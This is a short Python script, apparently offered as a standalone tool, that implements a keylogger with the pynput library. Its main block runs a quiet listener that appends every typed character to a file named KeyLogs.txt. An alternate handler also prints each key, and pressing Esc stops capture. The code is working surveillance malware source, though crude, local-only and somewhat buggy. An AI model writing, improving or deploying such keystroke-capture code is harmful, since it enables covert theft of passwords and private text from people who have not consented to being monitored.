import pynput, subprocess
from pynput import keyboard 

class KeyLogger:

    def __init__(self):
        super().__init__()

    @staticmethod
    def on_press(key):
        if key == keyboard.Key.esc:
            return False

        f = open(r"KeyLogs.txt","a")
        try:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(str(key.char))
            print('Key {0} pressed'.format(key.char))
            
        except AttributeError:
            print('Key {0} pressed'.format(key))
        
        f.close()

    @staticmethod
    def daemon(key):
        if key == keyboard.Key.esc:
            return False

        f = open(r"KeyLogs.txt","a")
        try:
            if hasattr(key, 'char'):
                if key == keyboard.Key.space:
                    f.write(" ")
                elif key == keyboard.Key.enter:
                    f.write("\n")
                else:
                    f.write(str(key.char))
        except AttributeError as e:
            print(e)
            exit(-1)
        
        f.close()

    def start(self):
        f = open("KeyLogs.txt", "w+")

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
        

if __name__=="__main__":
    f = open("KeyLogs.txt", "w+")
    
    with keyboard.Listener(on_press=KeyLogger.daemon) as listener:
        listener.join()
    